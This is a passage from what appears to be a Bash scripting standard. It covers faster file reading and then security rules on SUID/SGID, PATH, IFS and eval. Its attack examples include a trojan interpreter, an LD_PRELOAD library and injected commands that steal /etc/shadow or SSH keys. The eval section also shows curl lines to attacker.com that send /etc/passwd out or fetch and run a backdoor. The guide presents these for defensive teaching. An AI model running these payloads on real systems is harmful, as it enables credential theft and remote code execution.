# RECOMMENDED - Massively faster
content=$(< file.txt)
config=$(< /etc/app.conf)

# AVOID - 100x slower
content=$(cat file.txt)
```

**Rationale:** Bash reads file directly with zero external processes.

### 2. Single File Input to Command (3-4x speedup)

```bash
# RECOMMENDED
grep "pattern" < file.txt
while read line; do ...; done < file.txt
awk '{print $1}' < data.csv
jq '.field' < data.json

# AVOID - Wastes cat process
cat file.txt | grep "pattern"
cat data.csv | awk '{print $1}'
```

**Rationale:** Eliminates cat process entirely. Shell opens file, command reads stdin.

### 3. Loop Optimization (Massive cumulative gains)

```bash
# RECOMMENDED
for file in *.json; do
    data=$(< "$file")
    process "$data"
done

for logfile in /var/log/app/*.log; do
    errors=$(grep -c ERROR < "$logfile")
    if [ "$errors" -gt 0 ]; then
        alert=$(< "$logfile")
        send_alert "$alert"
    fi
done

# AVOID - Forks cat thousands of times
for file in *.json; do
    data=$(cat "$file")
    process "$data"
done
```

**Rationale:** In loops, fork overhead multiplies. 1000 iterations = 1000 avoided process creations.

## When NOT to Use `< filename`

| Scenario | Why Not | Use Instead |
|----------|---------|-------------|
| Multiple files | `< file1 file2` invalid syntax | `cat file1 file2` |
| Cat options needed | No `-n`, `-A`, `-E`, `-b`, `-s` support | `cat -n file` |
| Direct output | `< file` alone produces no output | `cat file` |
| Concatenation | Cannot combine multiple sources | `cat file1 file2 file3` |

### Invalid Usage Examples

```bash
# WRONG - Does nothing visible
< /tmp/test.txt
# Output: (nothing - redirection without command)

# WRONG - Invalid syntax
< file1.txt file2.txt

# RIGHT - Must use cat
cat file1.txt file2.txt
```

## Technical Details

### Why `< filename` Alone Does Nothing

```bash
# Opens file on stdin but has no command to consume it
< /tmp/test.txt
# Shell: Opens FD, no command to read it, closes FD

# These work - command consumes stdin
cat < /tmp/test.txt
< /tmp/test.txt cat
```

The `<` operator is a **redirection operator**, not a **command**. It only opens a file on stdin; you need a command to consume that input.

### Command Substitution Exception

```bash
# Magic case - bash reads file directly
content=$(< file.txt)
```

In command substitution context, bash itself reads the file and captures it. This is the only case where `< filename` works standalone (within `$()`).

## Performance Model

```
Fork overhead dominant:    Small files in loops    � 100x+ speedup
I/O with fork overhead:    Large files, single use � 3-4x speedup
Zero fork:                 Command substitution    � 100x+ speedup
```

Process creation overhead (fork/exec) dominates I/O time even for larger files.

## Real-World Example

### Before Optimization

```bash
for logfile in /var/log/app/*.log; do
    content=$(cat "$logfile")
    errors=$(cat "$logfile" | grep -c ERROR)
    warnings=$(cat "$logfile" | grep WARNING)
    if [ "$errors" -gt 0 ]; then
        cat "$logfile" error.log > combined.log
    fi
done
```

**Problems:** 4 cat processes per iteration. 100 log files = 400 process forks.

### After Optimization

```bash
for logfile in /var/log/app/*.log; do
    content=$(< "$logfile")              # 100x faster
    errors=$(grep -c ERROR < "$logfile") # No cat needed
    warnings=$(grep WARNING < "$logfile") # No cat needed
    if [ "$errors" -gt 0 ]; then
        cat "$logfile" error.log > combined.log  # Multiple files - must use cat
    fi
done
```

**Improvements:** 3 process forks eliminated per iteration. 100 log files = 300 fewer forks. 10-100x faster.

## Recommendations

**SHOULD:** Use `< filename` in performance-critical code for:
- Command substitution: `var=$(< file)`
- Single file input: `cmd < file`
- Loops with many file reads

**MAY:** Use `cat` when:
- Concatenating multiple files
- Need cat-specific options
- Code clarity more important than performance

**MUST:** Use `cat` when:
- Multiple file arguments needed
- Using options like `-n`, `-b`, `-E`, `-T`, `-s`, `-v`

## Impact Assessment

**Performance Gain:**
- Tight loops with command substitution: 10-100x faster
- Single command pipelines: 3-4x faster
- Large scripts with many file reads: 5-50x overall speedup

**Compatibility:**
- Works in bash 3.0+, zsh, ksh
- May not be optimized in very old shells (sh, dash)

**Code Clarity:**
- `$(< file)` is well-understood bash idiom
- `cmd < file` clearer than `cat file | cmd`
- No negative readability impact

## Testing

```bash
# Test command substitution speedup
echo "Test content" > /tmp/test.txt

time for i in {1..1000}; do content=$(cat /tmp/test.txt); done
# Expected: ~0.8-1.0s

time for i in {1..1000}; do content=$(< /tmp/test.txt); done
# Expected: ~0.01s (100x faster)

# Test pipeline speedup
seq 1 1000 > /tmp/numbers.txt

time for i in {1..500}; do cat /tmp/numbers.txt | wc -l > /dev/null; done
# Expected: ~0.4s

time for i in {1..500}; do wc -l < /tmp/numbers.txt > /dev/null; done
# Expected: ~0.1s (4x faster)
```


---


**Rule: BCS1000**

# Security Considerations

This section establishes security-first practices for production bash scripts, covering five critical areas: SUID/SGID prohibition (privilege escalation prevention), PATH security (command hijacking prevention), IFS safety (word-splitting vulnerability prevention), `eval` restrictions (injection risk mitigation), and input sanitization (validation and cleaning patterns). These practices prevent privilege escalation, command injection, path traversal, and other common attack vectors.


---


**Rule: BCS1001**

## SUID/SGID

**Never use SUID (Set User ID) or SGID (Set Group ID) bits on Bash scripts. This is a critical security prohibition with no exceptions.**

```bash
#  NEVER do this - catastrophically dangerous
chmod u+s /usr/local/bin/myscript.sh  # SUID
chmod g+s /usr/local/bin/myscript.sh  # SGID

#  Correct - use sudo for elevated privileges
sudo /usr/local/bin/myscript.sh

#  Correct - configure sudoers for specific commands
# In /etc/sudoers:
# username ALL=(ALL) NOPASSWD: /usr/local/bin/myscript.sh
```

**Rationale:**

- **IFS Exploitation**: Attacker manipulates `IFS` to control word splitting and execute commands with elevated privileges
- **PATH Manipulation**: Kernel uses caller's `PATH` to find interpreter, enabling trojan attacks even when script sets secure `PATH`
- **Library Injection**: `LD_PRELOAD`/`LD_LIBRARY_PATH` inject malicious code before script execution
- **Shell Expansion**: Brace, tilde, parameter, command substitution, and glob expansions create attack vectors
- **Race Conditions**: TOCTOU vulnerabilities in file operations
- **Interpreter Vulnerabilities**: Bash bugs exploitable when running with elevated privileges
- **No Compilation**: Readable, modifiable source increases attack surface

**Why SUID/SGID bits are dangerous on shell scripts:**

For compiled binaries, the kernel loads machine code directly. For shell scripts, the kernel: (1) reads shebang, (2) executes interpreter with SUID/SGID privileges, (3) interpreter processes script performing expansions. This multi-step process creates attack vectors absent in compiled programs.

**Attack Examples:**

**1. IFS Exploitation:**

```bash
# Vulnerable SUID script (owned by root)
#!/bin/bash
# /usr/local/bin/vulnerable.sh (SUID root)
set -euo pipefail

service_name="$1"
status=$(systemctl status "$service_name")
echo "$status"
```

**Attack:**
```bash
export IFS='/'
./vulnerable.sh "../../etc/shadow"
# With IFS='/', path splits into words, potentially exposing sensitive files
```

**2. PATH Attack (interpreter resolution):**

```bash
# SUID script: /usr/local/bin/backup.sh (owned by root)
#!/bin/bash
set -euo pipefail
PATH=/usr/bin:/bin  # Script sets secure PATH

tar -czf /backup/data.tar.gz /var/data
```

**Attack:**
```bash
# Attacker creates malicious bash
mkdir /tmp/evil
cat > /tmp/evil/bash << 'EOF'
#!/bin/bash
cp -r /root/.ssh /tmp/stolen_keys
exec /bin/bash "$@"
EOF
chmod +x /tmp/evil/bash

export PATH=/tmp/evil:$PATH
/usr/local/bin/backup.sh
# Kernel uses caller's PATH to find interpreter - attacker's code runs as root BEFORE script's PATH is set
```

**3. Library Injection Attack:**

```bash
# SUID script: /usr/local/bin/report.sh
#!/bin/bash
set -euo pipefail

echo "System Report" > /root/report.txt
df -h >> /root/report.txt
```

**Attack:**
```bash
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init(void) {
    if (geteuid() == 0) {
        system("cp /etc/shadow /tmp/shadow_copy");
        system("chmod 644 /tmp/shadow_copy");
    }
}
EOF

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
LD_PRELOAD=/tmp/evil.so /usr/local/bin/report.sh
# Malicious library runs with root privileges before script
```

**4. Command Injection via Unquoted Variables:**

```bash
# Vulnerable SUID script
#!/bin/bash
# /usr/local/bin/cleaner.sh (SUID root)

directory="$1"
find "$directory" -type f -mtime +30 -delete
```

**Attack:**
```bash
/usr/local/bin/cleaner.sh "/tmp -o -name 'shadow' -exec cat /etc/shadow > /tmp/shadow_copy \;"
# Injected find command exfiltrates /etc/shadow
```

**5. Symlink Race Condition:**

```bash
# Vulnerable SUID script
#!/bin/bash
# /usr/local/bin/secure_write.sh (SUID root)
set -euo pipefail

output_file="$1"

if [[ -f "$output_file" ]]; then
  die 1 'File already exists'
fi

# Race condition window here!
echo "secret data" > "$output_file"
```

**Attack:**
```bash
# Terminal 1: Run script repeatedly
while true; do
  /usr/local/bin/secure_write.sh /tmp/output 2>/dev/null && break
done

# Terminal 2: Create symlink in race window
while true; do
  rm -f /tmp/output
  ln -s /etc/passwd /tmp/output
done
# Script writes to /etc/passwd if timing is right
```

**Safe Alternatives:**

**1. Use sudo with configured permissions:**

```bash
# /etc/sudoers.d/myapp
username ALL=(root) NOPASSWD: /usr/local/bin/myapp.sh
%admin ALL=(root) /usr/local/bin/backup.sh --backup-only
```

**2. Use capabilities (compiled programs only):**

```bash
setcap cap_net_bind_service=+ep /usr/local/bin/myserver
# Allows binding to ports < 1024 without full root
```

**3. Use setuid wrapper (compiled C program):**

```bash
# /usr/local/bin/backup_wrapper.c (compiled and SUID)
int main(int argc, char *argv[]) {
    if (argc != 2) return 1;
    setenv("PATH", "/usr/bin:/bin", 1);
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    unsetenv("IFS");
    execl("/usr/local/bin/backup.sh", "backup.sh", argv[1], NULL);
    return 1;
}
```

**4. Use PolicyKit (pkexec):**

```bash
pkexec /usr/local/bin/system-config.sh
```

**5. Use systemd service:**

```bash
# /etc/systemd/system/myapp.service
[Unit]
Description=My Application Service

[Service]
Type=oneshot
User=root
ExecStart=/usr/local/bin/myapp.sh
RemainAfterExit=no

# User triggers: systemctl start myapp.service
```

**Detection and Prevention:**

```bash
# Find SUID/SGID shell scripts (should return nothing)
find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \; | grep -i script

# List all SUID files
find / -type f -perm -4000 -ls 2>/dev/null

# Prevent accidental SUID
install -m 755 myscript.sh /usr/local/bin/
# Never use -m 4755 or chmod u+s on shell scripts
```

**Why sudo is safer:**

Sudo provides: (1) logging to /var/log/auth.log, (2) credential timeout, (3) granular control, (4) environment sanitization, (5) audit trail.

```bash
# /etc/sudoers.d/myapp
username ALL=(root) NOPASSWD: /usr/local/bin/backup.sh
# Logged: "username : TTY=pts/0 ; PWD=/home/username ; USER=root ; COMMAND=/usr/local/bin/backup.sh"
```

**Summary:**

- **Never** use SUID or SGID on shell scripts under any circumstances
- Shell scripts have too many attack vectors to be safe with elevated privileges
- Use `sudo` with carefully configured permissions
- For compiled programs needing specific privileges, use capabilities
- Use setuid wrappers (compiled C) if absolutely necessary to execute script with privileges
- Audit systems regularly: `find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \;`
- Modern Linux (since ~2005) ignores SUID on scripts by default, but many Unix variants still honor them

**Key principle:** If you think you need SUID on a shell script, you're solving the wrong problem. Redesign using sudo, PolicyKit, systemd services, or a compiled wrapper.


---


**Rule: BCS1002**

## PATH Security

**Always secure the PATH variable to prevent command substitution attacks and trojan binary injection.**

**Rationale:**

- **Command Hijacking**: Attacker-controlled directories in PATH allow malicious binaries to replace system commands
- **Current Directory Risk**: `.` or empty elements cause commands to execute from the current directory
- **Privilege Escalation**: Scripts with elevated privileges can be tricked into executing attacker code
- **Search Order Matters**: Earlier directories are searched first, enabling priority-based attacks
- **Environment Inheritance**: PATH inherited from caller's environment may be malicious
- **Defense in Depth**: PATH security is critical even with other precautions

**Lock down PATH at script start:**

```bash
#!/bin/bash
set -euo pipefail

#  Correct - set secure PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH

# Rest of script uses locked-down PATH
command=$(which ls)  # Searches only trusted directories
```

**Alternative: Validate existing PATH:**

```bash
#!/bin/bash
set -euo pipefail

#  Correct - validate PATH contains no dangerous elements
[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory'
[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element'
[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element'
[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element'
[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp'
[[ "$PATH" =~ ^/home ]] && die 1 'PATH starts with user home directory'
```

**Attack Example: Current Directory in PATH**

```bash
# Attacker creates malicious 'ls' in /tmp
cat > /tmp/ls << 'EOF'
#!/bin/bash
cp /etc/shadow /tmp/stolen_shadow
chmod 644 /tmp/stolen_shadow
/bin/ls "$@"  # Execute real ls to appear normal
EOF
chmod +x /tmp/ls

# Attacker sets PATH with /tmp first
export PATH=/tmp:$PATH
cd /tmp
/usr/local/bin/backup.sh  # Executes /tmp/ls instead of /bin/ls
```

**Secure PATH patterns:**

**Pattern 1: Complete lockdown (recommended):**

```bash
#!/bin/bash
set -euo pipefail

# Lock down PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

tar -czf /backup/data.tar.gz /var/data
```

**Pattern 2: Full command paths (maximum security):**

```bash
#!/bin/bash
set -euo pipefail

# Don't rely on PATH at all - use absolute paths
/bin/tar -czf /backup/data.tar.gz /var/data
/usr/bin/systemctl restart nginx
/bin/rm -rf /tmp/workdir
```

**Pattern 3: PATH validation with fallback:**

```bash
#!/bin/bash
set -euo pipefail

validate_path() {
  if [[ "$PATH" =~ \.  ]] || \
     [[ "$PATH" =~ ^:  ]] || \
     [[ "$PATH" =~ ::  ]] || \
     [[ "$PATH" =~ :$  ]] || \
     [[ "$PATH" =~ /tmp ]]; then
    export PATH='/usr/local/bin:/usr/bin:/bin'
    readonly PATH
    warn 'Suspicious PATH detected, reset to safe default'
  fi
}

validate_path
```

**Pattern 4: Command verification:**

```bash
#!/bin/bash
set -euo pipefail

verify_command() {
  local cmd=$1
  local expected_path=$2
  local actual_path

  actual_path=$(command -v "$cmd")

  if [[ "$actual_path" != "$expected_path" ]]; then
    die 1 "Security: $cmd is $actual_path, expected $expected_path"
  fi
}

# Verify before using critical commands
verify_command tar /bin/tar
verify_command rm /bin/rm

tar -czf backup.tar.gz data/
```

**Anti-patterns:**

```bash
#  Wrong - trusting inherited PATH
#!/bin/bash
set -euo pipefail
ls /etc  # Could execute trojan ls from caller's PATH

#  Wrong - PATH includes current directory
export PATH=.:$PATH

#  Wrong - PATH includes /tmp
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin

#  Wrong - empty elements in PATH
export PATH=/usr/local/bin::/usr/bin:/bin  # :: is current directory
export PATH=:/usr/local/bin:/usr/bin:/bin  # Leading : is current directory

#  Wrong - setting PATH late in script
#!/bin/bash
set -euo pipefail
whoami  # Uses inherited PATH (dangerous!)
export PATH='/usr/bin:/bin'  # Too late!

#  Correct - set PATH at top
#!/bin/bash
set -euo pipefail
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH
```

**Edge case: Scripts needing custom paths:**

```bash
#!/bin/bash
set -euo pipefail

# Start with secure base PATH
readonly BASE_PATH='/usr/local/bin:/usr/bin:/bin'
readonly APP_PATH='/opt/myapp/bin'

# Combine with secure base first
export PATH="$BASE_PATH:$APP_PATH"
readonly PATH

# Validate application path exists and is not world-writable
[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist: $APP_PATH"
[[ -w "$APP_PATH" ]] && die 1 "Application path is writable: $APP_PATH"
```

**Checking PATH security:**

```bash
check_path_security() {
  local -a issues=()

  [[ "$PATH" =~ \.  ]] && issues+=('contains current directory (.)')
  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element')
  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)')
  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element')
  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp')

  if ((${#issues[@]} > 0)); then
    error 'PATH security issues detected:'
    local issue
    for issue in "${issues[@]}"; do
      error "  - $issue"
    done
    return 1
  fi

  info 'PATH security check passed'
  return 0
}

check_path_security || die 1 'PATH security validation failed'
```

**Summary:**

- **Always set PATH** explicitly at start of security-critical scripts
- **Use `readonly PATH`** to prevent later modification
- **Never include** `.`, empty elements, `/tmp`, or user directories
- **Validate PATH** if using inherited environment
- **Use absolute paths** for critical commands as defense in depth
- **Place PATH setting early** - first few lines after `set -euo pipefail`
- **Check permissions** on PATH directories (none should be world-writable)

**Key principle:** An attacker who controls your PATH controls which code runs. Always secure it first.


---


**Rule: BCS1003**

## IFS Manipulation Safety

**Never trust or use inherited IFS values. Always protect IFS changes to prevent field splitting attacks and unexpected behavior.**

**Rationale:**

- **Security Vulnerability**: Attackers manipulate IFS in calling environment to exploit scripts without IFS protection
- **Field Splitting Exploits**: Malicious IFS values cause word splitting at unexpected characters, breaking argument parsing and enabling command injection
- **Global Side Effects**: Unrestored IFS changes break subsequent operations throughout the script
- **Environment Inheritance**: IFS inherited from parent processes may be attacker-controlled

**Understanding IFS:**

IFS (Internal Field Separator) controls how Bash splits words during expansion. Default is `$' \t\n'` (space, tab, newline).

```bash
# Default IFS behavior
IFS=$' \t\n'  # Space, tab, newline (default)
data="one two three"
read -ra words <<< "$data"
# Result: words=("one" "two" "three")

# Custom IFS for CSV parsing
IFS=','
data="apple,banana,orange"
read -ra fruits <<< "$data"
# Result: fruits=("apple" "banana" "orange")
```

**Attack Example: Field Splitting Exploitation**

```bash
# Vulnerable script - doesn't protect IFS
#!/bin/bash
set -euo pipefail

process_files() {
  local -- file_list="$1"
  local -a files
  read -ra files <<< "$file_list"  # Vulnerable to IFS manipulation

  for file in "${files[@]}"; do
    rm -- "$file"
  done
}

# Normal usage
process_files "temp1.txt temp2.txt temp3.txt"
```

**Attack:**
```bash
# Attacker sets IFS to slash
export IFS='/'
./vulnerable-script.sh

# With IFS='/', read -ra splits on '/' not spaces
# files=("temp1.txt temp2.txt")  # NOT split - treated as one filename

# Or bypass filtering:
export IFS=$'\n'
./vulnerable-script.sh "/etc/passwd
/root/.ssh/authorized_keys"
```

**Attack Example: Command Injection via IFS**

```bash
# Vulnerable script
#!/bin/bash
set -euo pipefail

user_input="$1"
read -ra cmd_parts <<< "$user_input"  # Splits on IFS
"${cmd_parts[@]}"
```

**Attack:**
```bash
# Attacker manipulates IFS
export IFS='X'
./vulnerable-script.sh "lsX-laX/etc/shadow"

# With IFS='X', splitting becomes:
# cmd_parts=("ls" "-la" "/etc/shadow")
# Bypasses input validation checking for spaces
```

**Safe Pattern 1: One-Line IFS Assignment (Preferred)**

```bash
#  Correct - IFS change applies only to single command
# VAR=value command applies VAR only to that command

# Parse CSV in one line
IFS=',' read -ra fields <<< "$csv_data"
# IFS automatically reset after read command

# Parse colon-separated PATH
IFS=':' read -ra path_dirs <<< "$PATH"

# Most concise and safe pattern for single operations
```

**Safe Pattern 2: Local IFS in Function**

```bash
#  Correct - use local to scope IFS change
parse_csv() {
  local -- csv_data="$1"
  local -a fields
  local -- IFS  # Make IFS local to this function

  IFS=','
  read -ra fields <<< "$csv_data"

  # IFS automatically restored when function returns
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
```

**Safe Pattern 3: Save and Restore IFS**

```bash
#  Correct - save, modify, restore
parse_csv() {
  local -- csv_data="$1"
  local -a fields
  local -- saved_ifs

  saved_ifs="$IFS"
  IFS=','
  read -ra fields <<< "$csv_data"
  IFS="$saved_ifs"  # Restore immediately

  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
```

**Safe Pattern 4: Subshell Isolation**

```bash
#  Correct - IFS change isolated to subshell
parse_csv() {
  local -- csv_data="$1"
  local -a fields

  # IFS change automatically reverts when subshell exits
  fields=( $(
    IFS=','
    read -ra temp <<< "$csv_data"
    printf '%s\n' "${temp[@]}"
  ) )

  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
```

**Safe Pattern 5: Explicitly Set IFS at Script Start**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Explicitly set IFS to known-safe value
# Defends against inherited malicious IFS
IFS=$' \t\n'  # Space, tab, newline (standard default)
readonly IFS  # Prevent modification
export IFS

# Rest of script operates with trusted IFS
```

**Edge Cases:**

```bash
# IFS with read -d (delimiter) - IFS still matters for field splitting
while IFS= read -r -d '' file; do
  # IFS= prevents field splitting
  # -d '' sets null byte as delimiter
  process "$file"
done < <(find . -type f -print0)

# IFS affects word splitting, NOT pathname expansion (globbing)
IFS=':'
files=*.txt  # Glob expands normally
echo $files  # Splits on ':' - WRONG!
echo "$files"  # Safe - no splitting

# Empty IFS disables field splitting entirely
IFS=''
data="one two three"
read -ra words <<< "$data"
# Result: words=("one two three")  # NOT split

# Useful to preserve exact input
IFS= read -r line < file.txt  # Preserves leading/trailing whitespace
```

**Anti-patterns:**

```bash
#  Wrong - modifying IFS without save/restore
IFS=','
read -ra fields <<< "$csv_data"
# IFS is now ',' for rest of script - BROKEN!

#  Wrong - trusting inherited IFS
#!/bin/bash
set -euo pipefail
read -ra parts <<< "$user_input"  # Vulnerable to manipulation

#  Wrong - forgetting to restore IFS in error cases
saved_ifs="$IFS"
IFS=','
some_command || return 1  # IFS not restored on error!
IFS="$saved_ifs"

#  Correct - use trap or subshell
(
  IFS=','
  some_command || return 1  # Subshell ensures IFS restored
)

#  Wrong - modifying IFS globally
IFS=$'\n'
for line in $(cat file.txt); do
  process "$line"
done
# Now ALL subsequent operations use wrong IFS!

#  Correct - isolate IFS change
while IFS= read -r line; do
  process "$line"
done < file.txt

#  Wrong - using IFS for complex parsing
IFS=':' read -r user pass uid gid name home shell <<< "$passwd_line"
# Fragile - breaks if any field contains ':'

#  Correct - use cut or awk for structured data
user=$(cut -d: -f1 <<< "$passwd_line")
uid=$(cut -d: -f3 <<< "$passwd_line")
```

**Complete Safe Example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Set IFS to known-safe value immediately
IFS=$' \t\n'
readonly IFS
export IFS

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Parse CSV data safely
parse_csv_file() {
  local -- csv_file="$1"

  while IFS= read -r line; do
    local -a fields
    IFS=',' read -ra fields <<< "$line"  # One-line pattern

    # Process fields with normal IFS
    info "Name: ${fields[0]}"
    info "Email: ${fields[1]}"
    info "Age: ${fields[2]}"
  done < "$csv_file"
}

main() {
  parse_csv_file 'data.csv'
}

main "$@"

#fin
```

**Testing IFS Safety:**

```bash
# Test script behavior with malicious IFS
test_ifs_safety() {
  local -- original_ifs="$IFS"

  IFS='/'  # Set malicious IFS
  parse_csv_line "apple,banana,orange"

  # Verify IFS was restored
  if [[ "$IFS" == "$original_ifs" ]]; then
    success 'IFS properly protected'
  else
    error 'IFS leaked - security vulnerability!'
    return 1
  fi
}

# Display current IFS (non-printable characters shown)
debug_ifs() {
  local -- ifs_visual
  ifs_visual=$(printf '%s' "$IFS" | cat -v)
  >&2 echo "DEBUG: Current IFS: [$ifs_visual]"
  >&2 echo "DEBUG: IFS length: ${#IFS}"
  >&2 printf 'DEBUG: IFS bytes: %s\n' "$(printf '%s' "$IFS" | od -An -tx1)"
}

# Verify IFS is default
verify_default_ifs() {
  local -- expected=$' \t\n'
  if [[ "$IFS" == "$expected" ]]; then
    info 'IFS is default (safe)'
  else
    warn 'IFS is non-standard'
    debug_ifs
  fi
}
```

**Summary:**

- **Set IFS explicitly** at script start: `IFS=$' \t\n'; readonly IFS`
- **Use one-line assignment** for single commands: `IFS=',' read -ra fields <<< "$data"`
- **Use local IFS** in functions to scope changes: `local -- IFS; IFS=','`
- **Use subshells** to isolate IFS changes: `( IFS=','; read -ra fields <<< "$data" )`
- **Always restore IFS** if modifying: `saved_ifs="$IFS"; IFS=','; ...; IFS="$saved_ifs"`
- **Never trust inherited IFS** - always set it yourself
- **Test IFS safety** as part of security validation

**Key principle:** IFS is a global variable affecting word splitting throughout your script. Treat it as security-critical and always protect changes with proper scoping or save/restore patterns.


---


**Rule: BCS1004**

## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary, and even then, seek alternatives first.**

**Rationale:**

- **Code Injection**: `eval` executes arbitrary code, allowing complete system compromise if attacker-controlled
- **No Sandboxing**: Runs with full script privileges (file/network/command access)
- **Bypasses Validation**: Even sanitized input can contain metacharacters enabling injection
- **Difficult to Audit**: Dynamic code construction makes security review nearly impossible
- **Error Prone**: Quoting/escaping requirements complex and frequently implemented incorrectly
- **Better Alternatives Exist**: Almost every use case has safer alternatives

**Understanding eval:**

`eval` performs all expansions on a string, then executes the result.

```bash
# The danger: eval performs expansion TWICE
var='$(whoami)'
eval "echo $var"  # First expansion: echo $(whoami)
                   # Second expansion: executes whoami command!
```

**Attack Example 1: Direct Command Injection**

```bash
# Vulnerable - NEVER DO THIS!
user_input="$1"
eval "$user_input"
```

**Attack:**
```bash
./vulnerable-script.sh 'rm -rf /tmp/*'
./vulnerable-script.sh 'curl -X POST -d @/etc/passwd https://attacker.com/collect'
./vulnerable-script.sh 'curl https://attacker.com/backdoor.sh | bash'
./vulnerable-script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
```

**Attack Example 2: Variable Name Injection**

```bash
# Vulnerable - seems safe but isn't!
var_name="$1"
var_value="$2"
eval "$var_name='$var_value'"
```

**Attack:**
```bash
./vulnerable-script.sh 'x=$(rm -rf /important/data)' 'ignored'
./vulnerable-script.sh 'x' '$(cat /etc/shadow > /tmp/stolen)'
```

**Attack Example 3: Sanitization Bypass**

```bash
# Attempt to sanitize - INSUFFICIENT!
sanitized="${user_expr//[^0-9+\\-*\\/]/}"
eval "result=$sanitized"
```

**Attack:**
```bash
./vulnerable-script.sh 'PATH=0'  # Overwrites critical variable
```

**Safe Alternative 1: Use Arrays for Command Construction**

```bash
# ✓ Correct - build command safely with array
build_find_command() {
  local -- search_path="$1"
  local -- file_pattern="$2"
  local -a cmd

  cmd=(find "$search_path" -type f -name "$file_pattern")
  "${cmd[@]}"
}
```

**Safe Alternative 2: Use Indirect Expansion**

```bash
# ✗ Wrong
var_name='HOME'
eval "value=\\$$var_name"

# ✓ Correct - indirect expansion
echo "${!var_name}"

# ✓ Correct - for assignment
printf -v "$var_name" '%s' "$value"
```

**Safe Alternative 3: Use Associative Arrays**

```bash
# ✗ Wrong
for i in {1..5}; do
  eval "var_$i='value $i'"
done

# ✓ Correct
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done
```

**Safe Alternative 4: Use Functions Instead of Dynamic Code**

```bash
# ✗ Wrong
eval "${action}_function"

# ✓ Correct - case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  restart) restart_function ;;
  status)  status_function ;;
  *)       die 22 "Invalid action: $action" ;;
esac

# ✓ Also correct - associative array
declare -A actions=(
  [start]=start_function
  [stop]=stop_function
  [restart]=restart_function
  [status]=status_function
)

if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
else
  die 22 "Invalid action: $action"
fi
```

**Safe Alternative 5: Use Command Substitution**

```bash
# ✗ Wrong
cmd='ls -la /tmp'
eval "output=\$($cmd)"

# ✓ Correct
output=$(ls -la /tmp)

# ✓ Correct - if command in variable
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
```

**Safe Alternative 6: Use read for Parsing**

```bash
# ✗ Wrong
config_line="PORT=8080"
eval "$config_line"

# ✓ Correct - validate before assignment
IFS='=' read -r key value <<< "$config_line"
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
else
  die 22 "Invalid configuration key: $key"
fi
```

**Safe Alternative 7: Arithmetic Expansion**

```bash
# ✗ Wrong
eval "result=$((user_expr))"

# ✓ Correct - validate first
if [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]]; then
  result=$((user_expr))
else
  die 22 "Invalid arithmetic expression: $user_expr"
fi
```

**Edge Cases:**

**Dynamic variable names:**

```bash
# ✓ Use associative array
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done
```

**Building complex commands:**

```bash
# ✓ Use array
declare -a cmd=(find /data -type f)
[[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
[[ -n "$size" ]] && cmd+=(-size "$size")
"${cmd[@]}"
```

**Anti-patterns:**

```bash
# ✗ Wrong - eval with user input
eval "$user_command"

# ✓ Correct - whitelist validation
case "$user_command" in
  start|stop|restart|status) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac

# ✗ Wrong - eval for variable assignment
eval "$var_name='$var_value'"

# ✓ Correct
printf -v "$var_name" '%s' "$var_value"

# ✗ Wrong - eval to check if variable set
eval "if [[ -n \\$$var_name ]]; then echo set; fi"

# ✓ Correct
if [[ -v "$var_name" ]]; then
  echo set
fi

# ✗ Wrong - double expansion
eval "echo \$$var_name"

# ✓ Correct
echo "${!var_name}"
```

**Complete safe example (no eval):**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Configuration using associative array
declare -A config=(
  [app_name]='myapp'
  [app_port]='8080'
  [app_host]='localhost'
)

# Dynamic function dispatch
declare -A actions=(
  [start]=start_service
  [stop]=stop_service
  [restart]=restart_service
  [status]=status_service
)

start_service() {
  info "Starting ${config[app_name]} on ${config[app_host]}:${config[app_port]}"
}

stop_service() {
  info "Stopping ${config[app_name]}"
}

restart_service() {
  stop_service
